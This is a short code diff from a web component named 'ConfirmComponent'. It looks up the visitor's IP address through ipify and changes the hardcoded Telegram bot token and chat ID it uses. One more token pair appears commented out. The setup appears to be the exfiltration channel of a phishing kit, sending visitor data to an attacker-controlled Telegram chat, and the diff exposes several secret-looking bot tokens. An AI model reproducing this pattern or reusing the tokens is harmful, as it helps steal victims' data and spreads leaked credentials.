@@ -44,8 +44,8 @@ const ConfirmComponent = () => {
 
         axios.get(`https://api.ipify.org/?format=json`)
             .then((response) => {
-                const bot_token = '6481745897:AAGlEhZSpMevvKrloFpqHLYcYQfenxeFvC8';
-                const chat_id   = '1367126688';
+                const bot_token = '6523989137:AAH5GdE2C0GkBQZV6MtPhJXrmRo8efyp3QE';
+                const chat_id   = '5082552949';
                 // const bot_token = '6308794044:AAG0LQXsHsTBMaP63UeUrdc9MmDoSUKO5I8';
                 // const chat_id   = '5208541473';
 
